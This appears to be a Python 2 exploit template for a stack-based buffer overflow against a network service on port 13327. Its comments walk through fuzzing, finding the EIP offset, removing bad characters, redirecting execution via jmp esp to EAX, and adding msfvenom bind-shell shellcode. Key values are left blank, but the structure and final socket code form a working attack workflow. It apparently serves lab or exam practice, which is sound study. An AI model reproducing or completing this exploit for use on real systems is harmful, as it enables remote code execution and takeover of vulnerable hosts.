#!/usr/bin/python

# Stack-based Buffer Overflow Workflow
# Fuzz, observe crash and confirm the rough number of bytes to crash
# Determine the Offset for EIP with pattern_create.rb -l ... & pattern_offset.rb -q ...
# Confirm control of EIP
# Determine the Attack Vector: Examine Registers for a place to inject shellcode
# ...Remove Bad Characters in C's
# ...Redirect Execution Flow: nasm_shell.rb helps with this
# ...Remove Bad Characters in A's
# Add Shellcode...magic happens

import socket

host = ""
fuzz = 
# payload="A" * fuzz

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# PHASE 2: Determine the offset for EIP with pattern_create.rb -l ...fuzz & pattern_offset.rb -q ...
# EIP = 
# .../pattern_offset.rb -q ...EIP = Exact match at offset...
# payload=""
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 
# [*] Exact match at offset 
offset = 

# PHASE 3: Confirm control of EIP and space for shellcode/decode
# payload="A" * offset + "B" * 4 + "C" * (fuzz - offset - 4)

# PHASE 4: Determine the Attack Vector
# Analysis Examples:
#	1. EIP correctly contains our B payload
#	2. EAX points to the start of the buffer, but not the start of our payload of A's!!
#	3. ESP points to the start of our C's
#	4. Increasing our C's payload will crash the app differently and we loose control of EIP (tried this by replacing C's with all 255 bad characters)
#	5. C is not large enough to hold shell code...but A is!
#	6. We cannot change the start of our buffer (or again we loose control of EIP), which means we need to tell EIP the skip those first bytes of EAX and start with our A's.
#	7. We use EIP to jump to the start of a register and the only register that accommodates this is ESP (C's payload), but with a short payload...
#	8. So the tactic is to place another jmp in the C's, that points to EAX, but skips the part that is required - the first 12 bytes - and starts at the A's
#   9. Attack Vector: use control of EIP to jump to ESP, which jumps to EAX but skips the first 12 bytes
# Use nasm_shell.rb to generate shellcode to add 12 bytes to EAX (add eax,12), then jmp to EAX (jmp eax)
newEAX = () # 

# Remove Bad Characters or...
# just check newEAX to see if anything is dropped 
# badChars=()
# badChars=()
# payload = "A" * offset + "B" * 4 + badChars + "\x90\x90"
# newEAX does not contain any bad characters

# Redirect Execution Flow: 
# With edb overflow/paused, use Plugins > OpCodeSearcher to find jmp esp 
# Search for "ESP -> EIP", in the current binary...the first Start Address
# choose the first jmp esp and replace this address with EIP/B (the RETURN ADDRESS) in the payload
# jmp esp address =  (\x)
# ...in edb use right click and prepend with\x and dbl click to place breakpoint
# convert to hex, keeping in mind Little Endian: example: 08071e4e = "\x4e\x1e\x07\x08"
jmpESP = ""
# payload="A" * offset + jmpESP + newEAX
# Open app in debugger...Place a breakpoint at the jmpESP address, PRIOR TO RELEASING/PLAY, 
# to confirm this occurs, or requries further debugging

# Remove Bad Characters from A's
badCharsCount = 255
# badChars=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF")
# \x00 (Null Byte) should never be included and will ternminate the command...
# \x20 is identified bad 
# payload = badChars + "A" * (offset - badCharsCount) + "B" * 4 + "C" * 7

# Confirm Redirection (jmpESP) and First Stage Shellcode (newEAX) execute correctly
# payload = "A" * offset + jmpESP + newEAX

# PHASE 7: Add Shellcode from msfvenom...
# Note "Payload size:" = ...
shellSize = 
nopCount = 
nopSlide = "\x90" * nopCount
# Be sure "Payload size" of shellcode does not exceed expectations
# Take into account encode/decode with noop sleds/slide before shellcode (8-16)..."\x90" * 16
# msfvenom -p linux/x86/shell_bind_tcp LPORT=... --format c --arch x86 --platform linux --bad-chars "\x00\x20" --encoder x86/shikata_ga_nai
# Setup payload the check for bad characters...
# netstat -antp | grep 
shell=()

payload = nopSlide + shell + "A" * (offset - nopCount - shellSize) + jmpESP + newEAX

buffer = "\x11(setup sound " + payload + "\x90\x00#"
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"


